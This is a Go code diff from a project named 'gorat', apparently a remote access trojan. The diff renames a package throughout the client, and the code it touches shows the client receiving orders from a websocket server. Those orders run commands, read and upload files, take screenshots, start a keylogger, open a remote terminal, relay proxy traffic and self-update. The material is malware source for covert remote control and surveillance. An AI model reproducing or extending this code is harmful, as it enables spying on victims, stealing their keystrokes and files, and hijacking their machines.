@@ -16,7 +16,7 @@ import (
 	"sync"
 	"time"
 
-	"gorat/common"
+	"gorat/pkg/protocol"
 
 	"github.com/gorilla/websocket"
 )
@@ -277,7 +277,7 @@ type Client struct {
 	terminalMgr *TerminalManager
 
 	// Channels
-	sendChan chan *common.Message
+	sendChan chan *protocol.Message
 	stopChan chan bool
 
 	// Proxy connections: map[proxyID-userID]net.Conn
@@ -344,7 +344,7 @@ func NewClient(config *Config, instanceMgr *InstanceManager) *Client {
 		updater:     updater,
 		autoStart:   autoStart,
 		terminalMgr: terminalMgr,
-		sendChan:    make(chan *common.Message, 256),
+		sendChan:    make(chan *protocol.Message, 256),
 		stopChan:    make(chan bool),
 		instanceMgr: instanceMgr,
 		proxyConns:  make(map[string]net.Conn),
@@ -357,20 +357,20 @@ func NewClient(config *Config, instanceMgr *InstanceManager) *Client {
 
 	// Set terminal output callbacks
 	terminalMgr.SetOutputCallback(func(sessionID, data string) {
-		payload := &common.TerminalOutputPayload{
+		payload := &protocol.TerminalOutputPayload{
 			SessionID: sessionID,
 			Data:      data,
 		}
-		client.sendMessage(common.MsgTypeTerminalOutput, payload)
+		client.sendMessage(protocol.MsgTypeTerminalOutput, payload)
 	})
 
 	terminalMgr.SetErrorCallback(func(sessionID, data string) {
-		payload := &common.TerminalOutputPayload{
+		payload := &protocol.TerminalOutputPayload{
 			SessionID: sessionID,
 			Data:      data,
 			Error:     "stderr",
 		}
-		client.sendMessage(common.MsgTypeTerminalOutput, payload)
+		client.sendMessage(protocol.MsgTypeTerminalOutput, payload)
 	})
 
 	return client
@@ -565,7 +565,7 @@ func (c *Client) authenticate() error {
 	hostname, _ := os.Hostname()
 	localIP := c.getLocalIP()
 
-	authPayload := &common.AuthPayload{
+	authPayload := &protocol.AuthPayload{
 		ClientID: c.config.ClientID,
 		Token:    c.config.ClientID, // Use machine ID as token
 		OS:       runtime.GOOS,
@@ -574,7 +574,7 @@ func (c *Client) authenticate() error {
 		IP:       localIP,
 	}
 
-	authMsg, err := common.NewMessage(common.MsgTypeAuth, authPayload)
+	authMsg, err := protocol.NewMessage(protocol.MsgTypeAuth, authPayload)
 	if err != nil {
 		return err
 	}
@@ -585,16 +585,16 @@ func (c *Client) authenticate() error {
 	}
 
 	// Wait for response
-	var respMsg common.Message
+	var respMsg protocol.Message
 	if err := c.conn.ReadJSON(&respMsg); err != nil {
 		return err
 	}
 
-	if respMsg.Type != common.MsgTypeAuthResponse {
+	if respMsg.Type != protocol.MsgTypeAuthResponse {
 		return ErrInvalidResponse
 	}
 
-	var authResp common.AuthResponsePayload
+	var authResp protocol.AuthResponsePayload
 	if err := respMsg.ParsePayload(&authResp); err != nil {
 		return err
 	}
@@ -653,9 +653,9 @@ func (c *Client) readPump(disconnectChan chan bool) {
 			}
 		}
 
-		// Not a proxy message, parse as common.Message
+		// Not a proxy message, parse as protocol.Message
 		jsonData, _ := json.Marshal(rawMsg)
-		var msg common.Message
+		var msg protocol.Message
 		if err := json.Unmarshal(jsonData, &msg); err != nil {
 			log.Printf("Failed to parse message: %v", err)
 			continue
@@ -715,54 +715,54 @@ func (c *Client) writePump(disconnectChan chan bool) {
 }
 
 // handleMessage handles incoming messages from the server
-func (c *Client) handleMessage(msg *common.Message) {
+func (c *Client) handleMessage(msg *protocol.Message) {
 	log.Printf("Received message: %s", msg.Type)
 
 	switch msg.Type {
-	case common.MsgTypeExecuteCommand:
+	case protocol.MsgTypeExecuteCommand:
 		c.handleExecuteCommand(msg)
 
-	case common.MsgTypeBrowseFiles:
+	case protocol.MsgTypeBrowseFiles:
 		c.handleBrowseFiles(msg)
 
-	case common.MsgTypeGetDrives:
+	case protocol.MsgTypeGetDrives:
 		c.handleGetDrives(msg)
 
-	case common.MsgTypeDownloadFile:
+	case protocol.MsgTypeDownloadFile:
 		c.handleDownloadFile(msg)
 
-	case common.MsgTypeUploadFile:
+	case protocol.MsgTypeUploadFile:
 		c.handleUploadFile(msg)
 
-	case common.MsgTypeTakeScreenshot:
+	case protocol.MsgTypeTakeScreenshot:
 		c.handleTakeScreenshot(msg)
 
-	case common.MsgTypeStartKeylogger:
+	case protocol.MsgTypeStartKeylogger:
 		c.handleStartKeylogger(msg)
 
-	case common.MsgTypeStopKeylogger:
+	case protocol.MsgTypeStopKeylogger:
 		c.handleStopKeylogger(msg)
 
-	case common.MsgTypeUpdate:
+	case protocol.MsgTypeUpdate:
 		c.handleUpdate(msg)
 
-	case common.MsgTypeStartTerminal:
+	case protocol.MsgTypeStartTerminal:
 		c.handleStartTerminal(msg)
 
-	case common.MsgTypeTerminalInput:
+	case protocol.MsgTypeTerminalInput:
 		c.handleTerminalInput(msg)
 
-	case common.MsgTypeStopTerminal:
+	case protocol.MsgTypeStopTerminal:
 		c.handleStopTerminal(msg)
 
-	case common.MsgTypeListProcesses:
+	case protocol.MsgTypeListProcesses:
 		c.handleListProcesses(msg)
 
-	case common.MsgTypeGetSystemInfo:
+	case protocol.MsgTypeGetSystemInfo:
 		c.handleGetSystemInfo(msg)
 
-	case common.MsgTypePing:
-		c.sendMessage(common.MsgTypePong, nil)
+	case protocol.MsgTypePing:
+		c.sendMessage(protocol.MsgTypePong, nil)
 
 	default:
 		log.Printf("Unknown message type: %s", msg.Type)
@@ -976,8 +976,8 @@ func (c *Client) relayProxyData(proxyID, userID string, remoteConn net.Conn, rem
 }
 
 // handleExecuteCommand handles command execution requests
-func (c *Client) handleExecuteCommand(msg *common.Message) {
-	var payload common.ExecuteCommandPayload
+func (c *Client) handleExecuteCommand(msg *protocol.Message) {
+	var payload protocol.ExecuteCommandPayload
 	if err := msg.ParsePayload(&payload); err != nil {
 		log.Printf("Failed to parse command payload: %v", err)
 		return
@@ -986,12 +986,12 @@ func (c *Client) handleExecuteCommand(msg *common.Message) {
 	log.Printf("Executing command: %s %v", payload.Command, payload.Args)
 	result := c.commandExec.Execute(&payload)
 
-	c.sendMessage(common.MsgTypeCommandResult, result)
+	c.sendMessage(protocol.MsgTypeCommandResult, result)
 }
 
 // handleBrowseFiles handles file browsing requests
-func (c *Client) handleBrowseFiles(msg *common.Message) {
-	var payload common.BrowseFilesPayload
+func (c *Client) handleBrowseFiles(msg *protocol.Message) {
+	var payload protocol.BrowseFilesPayload
 	if err := msg.ParsePayload(&payload); err != nil {
 		log.Printf("Failed to parse browse payload: %v", err)
 		return
@@ -1000,19 +1000,19 @@ func (c *Client) handleBrowseFiles(msg *common.Message) {
 	log.Printf("Browsing files: %s", payload.Path)
 	result := c.fileBrowser.Browse(&payload)
 
-	c.sendMessage(common.MsgTypeFileList, result)
+	c.sendMessage(protocol.MsgTypeFileList, result)
 }
 
 // handleGetDrives handles drive listing requests (Windows)
-func (c *Client) handleGetDrives(msg *common.Message) {
+func (c *Client) handleGetDrives(msg *protocol.Message) {
 	log.Printf("Getting drive list")
 	result := c.fileBrowser.GetDrives()
 
-	c.sendMessage(common.MsgTypeDriveList, result)
+	c.sendMessage(protocol.MsgTypeDriveList, result)
 }
 
 // handleDownloadFile handles file download requests
-func (c *Client) handleDownloadFile(msg *common.Message) {
+func (c *Client) handleDownloadFile(msg *protocol.Message) {
 	var payload struct {
 		Path string `json:"path"`
 	}
@@ -1024,12 +1024,12 @@ func (c *Client) handleDownloadFile(msg *common.Message) {
 	log.Printf("Downloading file: %s", payload.Path)
 	result := c.fileBrowser.ReadFile(payload.Path)
 
-	c.sendMessage(common.MsgTypeFileData, result)
+	c.sendMessage(protocol.MsgTypeFileData, result)
 }
 
 // handleUploadFile handles file upload requests
-func (c *Client) handleUploadFile(msg *common.Message) {
-	var payload common.FileDataPayload
+func (c *Client) handleUploadFile(msg *protocol.Message) {
+	var payload protocol.FileDataPayload
 	if err := msg.ParsePayload(&payload); err != nil {
 		log.Printf("Failed to parse upload payload: %v", err)
 		return
@@ -1046,12 +1046,12 @@ func (c *Client) handleUploadFile(msg *common.Message) {
 		response["error"] = err.Error()
 	}
 
-	c.sendMessage(common.MsgTypeFileData, response)
+	c.sendMessage(protocol.MsgTypeFileData, response)
 }
 
 // handleTakeScreenshot handles screenshot requests
-func (c *Client) handleTakeScreenshot(msg *common.Message) {
-	var payload common.ScreenshotPayload
+func (c *Client) handleTakeScreenshot(msg *protocol.Message) {
+	var payload protocol.ScreenshotPayload
 	if err := msg.ParsePayload(&payload); err != nil {
 		log.Printf("Failed to parse screenshot payload: %v", err)
 		// Use default payload
@@ -1060,12 +1060,12 @@ func (c *Client) handleTakeScreenshot(msg *common.Message) {
 	log.Printf("Taking screenshot")
 	result := c.screenshot.Capture(&payload)
 
-	c.sendMessage(common.MsgTypeScreenshotData, result)
+	c.sendMessage(protocol.MsgTypeScreenshotData, result)
 }
 
 // handleStartKeylogger handles keylogger start requests
-func (c *Client) handleStartKeylogger(msg *common.Message) {
-	var payload common.KeyloggerPayload
+func (c *Client) handleStartKeylogger(msg *protocol.Message) {
+	var payload protocol.KeyloggerPayload
 	if err := msg.ParsePayload(&payload); err != nil {
 		log.Printf("Failed to parse keylogger payload: %v", err)
 		return
@@ -1074,7 +1074,7 @@ func (c *Client) handleStartKeylogger(msg *common.Message) {
 	log.Printf("Starting keylogger: target=%s", payload.Target)
 	err := c.keylogger.Start(&payload)
 
-	status := &common.UpdateStatusPayload{
+	status := &protocol.UpdateStatusPayload{
 		Status: "started",
 	}
 	if err != nil {
@@ -1082,15 +1082,15 @@ func (c *Client) handleStartKeylogger(msg *common.Message) {
 		status.Error = err.Error()
 	}
 
-	c.sendMessage(common.MsgTypeUpdateStatus, status)
+	c.sendMessage(protocol.MsgTypeUpdateStatus, status)
 }
 
 // handleStopKeylogger handles keylogger stop requests
-func (c *Client) handleStopKeylogger(msg *common.Message) {
+func (c *Client) handleStopKeylogger(msg *protocol.Message) {
 	log.Printf("Stopping keylogger")
 	err := c.keylogger.Stop()
 
-	status := &common.UpdateStatusPayload{
+	status := &protocol.UpdateStatusPayload{
 		Status: "stopped",
 	}
 	if err != nil {
@@ -1098,12 +1098,12 @@ func (c *Client) handleStopKeylogger(msg *common.Message) {
 		status.Error = err.Error()
 	}
 
-	c.sendMessage(common.MsgTypeUpdateStatus, status)
+	c.sendMessage(protocol.MsgTypeUpdateStatus, status)
 }
 
 // handleUpdate handles update requests
-func (c *Client) handleUpdate(msg *common.Message) {
-	var payload common.UpdatePayload
+func (c *Client) handleUpdate(msg *protocol.Message) {
+	var payload protocol.UpdatePayload
 	if err := msg.ParsePayload(&payload); err != nil {
 		log.Printf("Failed to parse update payload: %v", err)
 		return
@@ -1112,7 +1112,7 @@ func (c *Client) handleUpdate(msg *common.Message) {
 	log.Printf("Updating to version %s", payload.Version)
 	result := c.updater.Update(&payload)
 
-	c.sendMessage(common.MsgTypeUpdateStatus, result)
+	c.sendMessage(protocol.MsgTypeUpdateStatus, result)
 
 	// If update successful, restart
 	if result.Status == "complete" {
@@ -1122,8 +1122,8 @@ func (c *Client) handleUpdate(msg *common.Message) {
 }
 
 // handleStartTerminal handles terminal start requests
-func (c *Client) handleStartTerminal(msg *common.Message) {
-	var payload common.StartTerminalPayload
+func (c *Client) handleStartTerminal(msg *protocol.Message) {
+	var payload protocol.StartTerminalPayload
 	if err := msg.ParsePayload(&payload); err != nil {
 		log.Printf("Failed to parse start terminal payload: %v", err)
 		return
@@ -1133,18 +1133,18 @@ func (c *Client) handleStartTerminal(msg *common.Message) {
 	err := HandleStartTerminal(c.terminalMgr, &payload)
 
 	if err != nil {
-		errorPayload := &common.TerminalOutputPayload{
+		errorPayload := &protocol.TerminalOutputPayload{
 			SessionID: payload.SessionID,
 			Data:      "",
 			Error:     err.Error(),
 		}
-		c.sendMessage(common.MsgTypeTerminalOutput, errorPayload)
+		c.sendMessage(protocol.MsgTypeTerminalOutput, errorPayload)
 	}
 }
 
 // handleTerminalInput handles terminal input
-func (c *Client) handleTerminalInput(msg *common.Message) {
-	var payload common.TerminalInputPayload
+func (c *Client) handleTerminalInput(msg *protocol.Message) {
+	var payload protocol.TerminalInputPayload
 	if err := msg.ParsePayload(&payload); err != nil {
 		log.Printf("Failed to parse terminal input payload: %v", err)
 		return
@@ -1157,8 +1157,8 @@ func (c *Client) handleTerminalInput(msg *common.Message) {
 }
 
 // handleStopTerminal handles terminal stop requests
-func (c *Client) handleStopTerminal(msg *common.Message) {
-	var payload common.TerminalInputPayload
+func (c *Client) handleStopTerminal(msg *protocol.Message) {
+	var payload protocol.TerminalInputPayload
 	if err := msg.ParsePayload(&payload); err != nil {
 		log.Printf("Failed to parse stop terminal payload: %v", err)
 		return
@@ -1172,33 +1172,33 @@ func (c *Client) handleStopTerminal(msg *common.Message) {
 }
 
 // handleListProcesses handles process list requests
-func (c *Client) handleListProcesses(msg *common.Message) {
+func (c *Client) handleListProcesses(msg *protocol.Message) {
 	log.Printf("Getting process list")
 
 	processes := getProcessList()
-	result := &common.ProcessListPayload{
+	result := &protocol.ProcessListPayload{
 		Processes: processes,
 	}
 
-	c.sendMessage(common.MsgTypeProcessList, result)
+	c.sendMessage(protocol.MsgTypeProcessList, result)
 }
 
 // handleGetSystemInfo handles system info requests
-func (c *Client) handleGetSystemInfo(msg *common.Message) {
+func (c *Client) handleGetSystemInfo(msg *protocol.Message) {
 	log.Printf("Getting system info")
 
 	info := getSystemInfo()
-	c.sendMessage(common.MsgTypeSystemInfo, info)
+	c.sendMessage(protocol.MsgTypeSystemInfo, info)
 }
 
 // getProcessList retrieves the list of running processes
-func getProcessList() []common.Process {
-	var processes []common.Process
+func getProcessList() []protocol.Process {
+	var processes []protocol.Process
 
 	// Implementation varies by OS
 	osProcesses := getOSProcessList()
 	for _, p := range osProcesses {
-		processes = append(processes, common.Process{
+		processes = append(processes, protocol.Process{
 			Name:   p.Name,
 			PID:    p.PID,
 			CPU:    p.CPU,
@@ -1225,14 +1225,14 @@ func getOSProcessList() []OSProcess {
 }
 
 // getSystemInfo retrieves system information
-func getSystemInfo() *common.SystemInfoPayload {
+func getSystemInfo() *protocol.SystemInfoPayload {
 	// This will be implemented per-OS in system_stats_*.go files
 	return getSystemInfoImpl()
 }
 
 // sendMessage sends a message to the server
-func (c *Client) sendMessage(msgType common.MessageType, payload interface{}) {
-	msg, err := common.NewMessage(msgType, payload)
+func (c *Client) sendMessage(msgType protocol.MessageType, payload interface{}) {
+	msg, err := protocol.NewMessage(msgType, payload)
 	if err != nil {
 		log.Printf("Failed to create message: %v", err)
 		return
@@ -1273,7 +1273,7 @@ func (c *Client) sendHeartbeat() {
 		diskUsage = stats["disk"]
 	}
 
-	payload := &common.HeartbeatPayload{
+	payload := &protocol.HeartbeatPayload{
 		ClientID:   c.config.ClientID,
 		Status:     "online",
 		CPUUsage:   cpuUsage,
@@ -1283,7 +1283,7 @@ func (c *Client) sendHeartbeat() {
 		LastActive: time.Now(),
 	}
 
-	c.sendMessage(common.MsgTypeHeartbeat, payload)
+	c.sendMessage(protocol.MsgTypeHeartbeat, payload)
 }
 
 // Main is the main entry point for the client
